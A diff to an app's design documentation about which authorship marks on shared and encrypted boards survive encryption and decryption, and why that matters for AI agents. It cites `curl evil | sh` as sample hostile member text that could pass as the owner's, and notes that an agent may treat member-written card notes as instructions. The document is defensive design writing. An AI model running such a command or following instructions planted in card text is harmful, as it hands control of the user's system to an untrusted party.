@@ -470,7 +470,10 @@ plaintext off an encrypted board from any path: MCP, the cloud model, a stale ta
 - Lane name clashes are checked in the tab, since the server can't compare names.
 
 **What it doesn't hide.** Your email, the number of lanes, cards, and files, file sizes,
-timestamps, card order, your theme, and usage and billing records. Also: Durable Objects allow
+timestamps, card order, your theme, and usage and billing records. On a board that was shared
+before it was encrypted, also which former member wrote on a card or attached a file: their
+email and when (`// TEAM_BOARDS`), kept so the marks are still there if the board is decrypted.
+Also: Durable Objects allow
 neither `PRAGMA secure_delete` nor `VACUUM` (both were tried), so rows erased when encryption
 goes on can linger in free pages of the database file, and Cloudflare keeps 30 days of
 point-in-time recovery. Text stored **before** encryption was turned on can outlive the switch
@@ -1732,9 +1735,17 @@ tags that direct them are the owner's alone, and so are the cards that carry the
   - **Cards marked before this** carry the old shape, `memberText: { email, at }`. It's read as
     `member.text` everywhere (`markOf`) and rewritten in the new shape the next time the card
     itself changes. No migration: it's a field on a card.
-  - **What it doesn't cover.** Encrypting a board rebuilds every card and file from known
-    fields and drops all of these marks; an encrypted board has no members and no agents, and
-    it takes removing every member first. And the mark is a warning, not a lock: an owner who
+  - **Encrypting a board keeps them, and so does decrypting it.** Both rebuild every card
+    and file from known fields (`TodoAgent.adopt`), and that used to drop every mark with no
+    "These words are mine now": remove the members, encrypt, decrypt, and a member's
+    `curl evil | sh` read as the owner's. Now `adopt` carries each card's `member` and each
+    file's `by` across from the live board, never from the copy the browser sent. Files are
+    uploaded again in both directions and get new ids, so a file takes the uploader of the
+    file in the same place on the same card. On the encrypted board the marks stay as they
+    are, an email and a time, not encrypted (`// END_TO_END_ENCRYPTION`, "What it doesn't
+    hide"). `check:members` shares a board, encrypts it, decrypts it, and reads the card
+    back over MCP.
+  - **What it doesn't cover.** The mark is a warning, not a lock: an owner who
     tags a member's card `#agent` has made it a work order, and an agent that ignores its
     rules can still read the notes as instructions. Read a member's card before tagging it.
 
